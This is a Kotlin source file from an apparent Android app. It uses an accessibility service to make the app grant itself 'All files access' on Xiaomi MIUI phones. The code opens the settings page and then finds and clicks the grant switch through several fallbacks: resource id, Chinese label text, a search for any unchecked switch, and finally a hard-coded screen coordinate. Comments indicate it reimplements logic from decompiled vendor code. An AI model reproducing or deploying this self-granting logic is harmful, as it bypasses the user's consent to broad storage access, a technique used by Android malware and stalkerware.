package com.storm.safe.rock.service.modules.yw5xud.miui

import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder

/**
 * MiuiAllFilesAccess -- Phase 4 ALL_FILES (MANAGE_EXTERNAL_STORAGE) delegate.
 * 4-level fallback strategy aligned with vendor C0367a4.m212254b3 (lines 1740-2172).
 *
 * Extracted from MiuiSteps.executeAllFilesAccess().
 */
class MiuiAllFilesAccess(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiAllFiles"
    }

    // ━━━━━━━━━ Early-exit checks ━━━━━━━━━

    internal fun isSdkSupported(): Boolean = android.os.Build.VERSION.SDK_INT >= 30

    internal fun isAlreadyGranted(): Boolean {
        return try { android.os.Environment.isExternalStorageManager() } catch (_: Exception) { false }
    }

    // ━━━━━━━━━ Intent launch ━━━━━━━━━

    internal fun launchPredwarmIntent(logs: MutableList<String>): Boolean {
        return try {
            val pkg = context.packageName
            val pre = if (android.os.Build.VERSION.SDK_INT < 35) {
                android.content.Intent().apply {
                    component = android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.appmanager.ApplicationsDetailsActivity"
                    )
                    putExtra("package_name", pkg)
                    flags = MiuiConstants.ALL_FILES_PREDWARM_FLAGS
                }
            } else {
                android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:$pkg")
                    flags = MiuiConstants.ALL_FILES_PREDWARM_FLAGS
                }
            }
            context.startActivity(pre)
            true
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            logs.add("MIUI ALL_FILES: predwarm failed ${e.message}")
            false
        }
    }

    internal fun launchMainIntent(logs: MutableList<String>): Boolean {
        return try {
            val main = android.content.Intent(
                android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
            ).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                flags = MiuiConstants.ALL_FILES_MAIN_FLAGS
            }
            context.startActivity(main)
            true
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            logs.add("MIUI ALL_FILES: main Intent failed ${e.message}")
            false
        }
    }

    // ━━━━━━━━━ 5-level fallback strategies ━━━━━━━━━

    /**
     * L0: Direct node click — find Switch by resource-id or findByText, then performAction(ACTION_CLICK).
     * Most reliable: no coordinate dependency, no visibleToUser filtering.
     */
    internal fun tryLevel0NodeClick(): Boolean {
        val rootPkg = ui.root()?.packageName?.toString() ?: "null"
        // Dump root node details for debugging
        val rootNode = ui.root()
        val rootClass = rootNode?.className?.toString() ?: "null"
        val rootChildCount = rootNode?.childCount ?: -1
        val rootWindow = try { rootNode?.window } catch (_: Exception) { null }
        val windowId = rootWindow?.id ?: -1
        val windowTitle = rootWindow?.title?.toString() ?: "null"
        Log.d(TAG, "[L0] start, rootPkg=$rootPkg, rootClass=$rootClass, children=$rootChildCount, windowId=$windowId, windowTitle=$windowTitle")

        // Also try getWindows() to see all accessible windows
        try {
            val svc = service
            if (svc != null) {
                val windows = svc.windows
                val windowInfo = windows?.joinToString(" | ") { w ->
                    "id=${w.id} title=${w.title} type=${w.type} layer=${w.layer} pkg=${w.root?.packageName}"
                } ?: "null"
                Log.d(TAG, "[L0] all windows: $windowInfo")

                // Try getting root from the correct window
                for (w in windows ?: emptyList()) {
                    val wRoot = w.root ?: continue
                    if (wRoot.packageName?.toString() == "com.android.settings") {
                        val wChildCount = wRoot.childCount
                        val wHasSw = try { wRoot.findAccessibilityNodeInfosByText("授予管理").isNotEmpty() } catch (_: Exception) { false }
                        Log.d(TAG, "[L0] settings window id=${w.id} title=${w.title} children=$wChildCount hasSw=$wHasSw")
                        if (wHasSw) {
                            // Use THIS window's root for node search
                            val swNode = try {
                                val nodes = wRoot.findAccessibilityNodeInfosByText("授予管理所有文件的权限")
                                nodes.firstOrNull()
                            } catch (_: Exception) { null }
                            if (swNode != null) {
                                var p: android.view.accessibility.AccessibilityNodeInfo? = swNode
                                for (depth in 0..5) {
                                    if (p == null) break
                                    if (p.isClickable && p.isCheckable && !p.isChecked) {
                                        Log.i(TAG, "[L0] found Switch via window id=${w.id}, clicking")
                                        return p.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    }
                                    p = try { p.parent } catch (_: Exception) { null }
                                }
                            }
                            // Fallback: find switchWidget by id in this window
                            val swById = try {
                                wRoot.findAccessibilityNodeInfosByViewId("com.android.settings:id/switchWidget")
                                    .firstOrNull { it.isCheckable && !it.isChecked }
                            } catch (_: Exception) { null }
                            if (swById != null) {
                                Log.i(TAG, "[L0] found switchWidget in window id=${w.id}, clicking")
                                return swById.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "[L0] getWindows failed: ${e.message}")
        }

        // Strategy A: by resource-id "switchWidget" (original, via rootInActiveWindow)
        val sw = ui.query("[id=\"com.android.settings:id/switchWidget\"][checkable=true][checked=false]")
        Log.d(TAG, "[L0-A] switchWidget query result: ${sw != null}")
        if (sw != null) {
            Log.i(TAG, "[L0-A] switchWidget found, clicking")
            return sw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
        }
        // Strategy B: findByText → walk up to clickable Switch
        val root = ui.root()
        if (root == null) { Log.w(TAG, "[L0-B] root is null"); return false }
        for (keyword in listOf("授予管理所有文件的权限", "授予管理所有文件", "管理所有文件")) {
            try {
                val nodes = root.findAccessibilityNodeInfosByText(keyword)
                Log.d(TAG, "[L0-B] findByText('$keyword') found ${nodes.size} nodes")
                for (node in nodes) {
                    var p: android.view.accessibility.AccessibilityNodeInfo? = node
                    for (depth in 0..5) {
                        if (p == null) break
                        if (p.isClickable && p.isCheckable && !p.isChecked) {
                            Log.i(TAG, "[L0-B] found clickable+checkable parent at depth=$depth, clicking")
                            return p.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        }
                        p = try { p.parent } catch (_: Exception) { null }
                    }
                }
            } catch (e: Exception) { Log.w(TAG, "[L0-B] exception for '$keyword': ${e.message}") }
        }
        // Strategy C: find any unchecked Switch
        val anySw = SwitchNodeFinder.findFirstUnchecked(root)
        Log.d(TAG, "[L0-C] DFS unchecked Switch: ${anySw != null}, clickable=${anySw?.isClickable}")
        if (anySw != null && anySw.isClickable) {
            Log.i(TAG, "[L0-C] found unchecked Switch, clicking")
            return anySw.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
        }
        Log.w(TAG, "[L0] all strategies failed")
        return false
    }

    /**
     * L1: Find text keyword -> walk parent chain -> find unchecked Switch -> gesture tap.
     * Uses UiAutomation.queryAll (GKD selector) instead of raw findAccessibilityNodeInfosByText.
     */
    internal suspend fun tryLevel1TextToggle(): Boolean {
        for (keyword in MiuiConstants.ALL_FILES_KEYWORDS) {
            val nodes = ui.queryAll("[text*=\"$keyword\"][visibleToUser=true]")
            for (n in nodes) {
                var p: android.view.accessibility.AccessibilityNodeInfo? = n
                for (depth in 0..5) {
                    if (p == null) break
                    val sw = SwitchNodeFinder.findFirstUnchecked(p)
                    if (sw != null) {
                        val r = android.graphics.Rect()
                        sw.getBoundsInScreen(r)
                        if (r.width() > 0 && r.height() > 0) {
                            val svc = service ?: return false
                            if (GestureTapHelper.performTap(
                                    svc, r.exactCenterX(), r.exactCenterY(),
                                    GestureTapHelper.TAP_DURATION_MS_SHORT
                                )
                            ) {
                                return true
                            }
                        }
                    }
                    p = try { p.parent } catch (_: Exception) { null }
                }
            }
        }
        return false
    }

    /**
     * L2: DFS from root to find first unchecked Switch -> gesture tap.
     * 4 rounds with 100ms delay between retries.
     */
    internal suspend fun tryLevel2DfsToggle(): Boolean {
        for (round in 0..3) {
            val root = ui.root() ?: return false
            val sw = SwitchNodeFinder.findFirstUnchecked(root)
            if (sw == null) {
                kotlinx.coroutines.delay(100L)
                continue
            }
            val r = android.graphics.Rect()
            sw.getBoundsInScreen(r)
            if (r.width() > 0 && r.height() > 0) {
                val svc = service ?: return false
                if (GestureTapHelper.performTap(
                        svc, r.exactCenterX(), r.exactCenterY(),
                        GestureTapHelper.TAP_DURATION_MS_SHORT
                    )
                ) {
                    return true
                }
            }
        }
        return false
    }

    /**
     * L3: Fixed coordinate fallback — tap at vendor-defined screen ratio.
     */
    internal suspend fun tryLevel3CoordFallback(
        coordX: Float,
        coordY: Float,
        logs: MutableList<String>
    ): Boolean {
        val svc = service ?: return false
        val ok = GestureTapHelper.performTap(svc, coordX, coordY, MiuiConstants.ALL_FILES_COORD_DURATION_MS)
        logs.add("MIUI ALL_FILES: L3 coord ($coordX,$coordY) dur=${MiuiConstants.ALL_FILES_COORD_DURATION_MS}ms")
        return ok
    }

    /**
     * L4: Verify Environment.isExternalStorageManager() with polling.
     */
    internal suspend fun verifyGranted(): Boolean {
        for (v in 0 until MiuiConstants.ALL_FILES_VERIFY_ROUNDS) {
            kotlinx.coroutines.delay(MiuiConstants.ALL_FILES_VERIFY_DELAY_MS)
            if (isAlreadyGranted()) return true
        }
        return false
    }

    // ━━━━━━━━━ Orchestrator ━━━━━━━━━

    /**
     * MIUI ALL_FILES authorization flow. Aligned with vendor C0367a4.m212254b3.
     *
     * 4-level fallback:
     *  L1 text toggleCheckBox(keyword)
     *  L2 DFS findFirstUnchecked Switch + gesture tap 50ms
     *  L3 fixed coordinate (w*0.875, h*0.225) gesture tap 100ms
     *  L4 3 x 150ms verify Environment.isExternalStorageManager()
     * Outer retry 3 times (i=0..2), each reopens main Intent.
     *
     * @return true if Environment.isExternalStorageManager() == true
     */
    @Suppress("DEPRECATION")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        if (!isSdkSupported()) {
            logs.add("MIUI ALL_FILES: SDK<30 skip")
            return false
        }
        if (isAlreadyGranted()) {
            logs.add("MIUI ALL_FILES: already granted")
            successes.add("all_files_access")
            return true
        }

        val dm = context.resources.displayMetrics
        val coordX = dm.widthPixels * MiuiConstants.ALL_FILES_COORD_X_RATIO
        val coordY = dm.heightPixels * MiuiConstants.ALL_FILES_COORD_Y_RATIO

        logs.add("MIUI ALL_FILES: attempting")

        launchPredwarmIntent(logs)
        kotlinx.coroutines.delay(300L)
        if (!launchMainIntent(logs)) {
            failures.add("all_files_access: launch failed")
            return false
        }
        kotlinx.coroutines.delay(2000L)

        val clicked = tryLevel0NodeClick() || tryLevel1TextToggle() || tryLevel2DfsToggle()
        if (!clicked) {
            tryLevel3CoordFallback(coordX, coordY, logs)
        }

        if (verifyGranted()) {
            successes.add("all_files_access")
            logs.add("MIUI ALL_FILES: granted")
            return true
        }

        failures.add("all_files_access")
        logs.add("MIUI ALL_FILES: failed")
        return false
    }
}
